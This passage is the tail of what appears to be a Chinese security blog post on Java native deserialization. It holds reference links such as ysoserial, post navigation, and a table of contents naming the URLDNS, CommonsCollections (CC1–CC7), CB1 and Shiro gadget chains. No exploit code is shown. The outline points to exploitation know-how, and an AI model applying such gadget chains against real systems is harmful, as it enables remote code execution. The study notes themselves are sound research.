<p>[3] <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p>
<p>[5] <a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/">https://boogipop.com/2023/03/02/Java反序列化研究/</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/16/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94RMI%203ca75d88fc8d4a1b9988a56475a5b265/">← Next Java Sec —— RMI</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/30/Remote%20Code%20Execution%20from%20SSTI%20in%20the%20Sandbox%20Aut%207020c30e8f32462281b933608ffc7d25/">《Remote Code Execution from SSTI in the Sandbox Automatically Detecting and Exploiting Template Escape Bugs》论文笔记 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Java 学习笔记——原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.</span> <span class="toc-text">0x00. PHP 反序列化与 Java 反序列化的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-URLDNS-DNS-%E6%8E%A2%E6%B5%8B%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">0x01. URLDNS DNS 探测器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CC1-work-on-JDK-%E2%89%A4-8u71"><span class="toc-number">1.3.</span> <span class="toc-text">0x02. CC1 (work on JDK ≤ 8u71)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CC6-%E7%AA%81%E7%A0%B4-AnnotationInvocationHandler-%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">0x03. CC6 突破 AnnotationInvocationHandler 高版本限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CC3-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81-%E2%80%94%E2%80%94-templatesImpl-%E4%B8%8A%E5%9C%BA%EF%BC%81"><span class="toc-number">1.5.</span> <span class="toc-text">0x04. CC3 动态加载字节码 —— templatesImpl 上场！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Shiro-%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">0x05. Shiro 中的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-CC4"><span class="toc-number">1.7.</span> <span class="toc-text">CC2-CC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.8.</span> <span class="toc-text">CC5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">1.9.</span> <span class="toc-text">CC7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CB1"><span class="toc-number">1.10.</span> <span class="toc-text">CB1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C11-%E2%80%94%E2%80%94-%E9%AD%94%E6%94%B9-yso"><span class="toc-number">1.11.</span> <span class="toc-text">C11 —— 魔改 yso</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.12.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>